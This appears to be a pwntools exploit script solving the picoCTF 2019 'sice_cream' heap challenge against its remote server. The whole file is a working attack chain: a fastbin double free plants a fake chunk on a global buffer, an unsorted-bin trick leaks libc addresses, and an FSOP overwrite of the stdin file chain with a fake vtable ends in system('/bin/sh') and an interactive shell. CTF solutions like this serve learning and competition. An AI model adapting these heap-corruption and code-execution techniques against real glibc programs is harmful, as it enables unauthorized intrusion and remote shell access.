from pwn import *

def buy(size, data):
	p.recv()
	p.sendline('1')
	p.recv()
	p.sendline(str(size))
	p.recv()
	p.sendline(data)

def eat(index):
	p.recv()
	p.sendline('2')
	p.recv()
	p.sendline(str(index))

def rename(name):
	p.recv()
	p.sendline('3')
	p.recv()
	p.sendline(name)

u64 = make_unpacker(64, endian='little', sign='unsigned')

name_address = 0x0602040
_IO_2_1_stdin_chain_offset = 0x3c4948
system_offset = 0x45390

p = remote("2019shell1.picoctf.com" , 3972)
# p = process('./sice_cream')
# gdb.attach(p)
#libc = ELF('./libc.so.6')


# Leak libc address
p.recv()
p.sendline(p64(0x0) + p64(0x21)*25)	# fake chunk with size 0x21

buy(20, "A"*8)
buy(20, "B"*8)
eat(0)
eat(1)
eat(0)	# double free
buy(20, p64(name_address))	# corrupt fastbin - insert fake chunk to linked list
buy(20, "C"*8)
buy(20, "D"*8)
buy(20, p64(0x5555555566666666))	# return our fake chunk - points to the global name
rename(p64(0x0) + p64(0x91))		# rename - change the size of chunk to be bigger than fastbin chunks
eat(5)	# free fake chunk to unsorted bin (FD/BK points now to libc addresses)
rename("A"*(8+7))	# remove null bytes to leak the libc addresses in the global name buffer
p.recvline()
p.recvline()
leak = p.recvline()
leak = leak[:-2]
leak = u64(leak.ljust(8, "\x00"))
log.info("leak:		{}".format(hex(leak)))
libc_base = leak - 0x3c4b78
log.info("libc base:	{}".format(hex(libc_base)))
_IO_2_1_stdin_chain = libc_base + _IO_2_1_stdin_chain_offset
log.info("_IO_2_1_stdin_chain:	{}".format(hex(_IO_2_1_stdin_chain)))
system = libc_base + system_offset
log.info("system:	{}".format(hex(system)))

"""
unsorted-bin & FSOP attack >> change code execution:
overwrite the value of global _IO_2_1_stdin_chain.file._chain to point to global name buffer
rename to global name with fake _IO_FILE_plus structure where vtable points to fake vtable (global buffer + 0x30)
with pointers to system function
"""
data = p64(name_address) + p64(name_address + 0x10) + p64(system)*21 + p64(name_address + 0x30)
rename("/bin/sh;" + p64(0x61) + p64(leak) + p64(_IO_2_1_stdin_chain-0x10) + data)
buy(50, "echo SHELL")	# trigger malloc memory corrupiton error - call system('/bin/sh')

p.sendline("ls")


print('-'*70)
p.interactive()